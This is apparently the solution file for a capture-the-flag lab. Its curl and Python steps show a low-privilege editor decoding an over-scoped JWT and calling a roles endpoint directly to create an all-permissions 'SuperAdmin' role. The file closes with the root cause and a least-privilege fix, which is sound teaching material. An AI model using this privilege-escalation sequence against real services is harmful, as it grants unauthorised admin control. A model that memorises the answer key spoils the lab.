# SOLUTION — Lab-11

```bash
# 1) login as the low-priv Editor
curl -X POST http://127.0.0.1:8011/login -H "Content-Type: application/json" -d '{"user":"editor"}'
# -> {"token":"eyJ...","role":"Backoffice Editor"}

# 2) decode YOUR token (middle segment is base64url JSON - no secret needed to READ it)
echo "<middle-segment>" | python -c "import base64,sys,json; s=sys.stdin.read().strip(); print(json.loads(base64.urlsafe_b64decode(s+'='*(-len(s)%4))))"
# -> {"sub":"u-editor","role":"Backoffice Editor","scopes":["dp.entitlements.plans.read","dp.entitlements.plans.write"],...}

# 3) the disabled UI is cosmetic - POST directly with the over-scoped token
curl -X POST http://127.0.0.1:8011/development/entitlements/roles \
 -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
 -d '{"name":"SuperAdmin","permissions":["*"]}'
# -> 201 + FLAG{...}
```

**Root cause:** token issuance grants scopes the role should never hold;
the endpoint authorizes purely from those claims.
**Fix:** least-privilege scopes at issuance + a dedicated
`roles.write` scope (never reuse the `plans` namespace for roles).
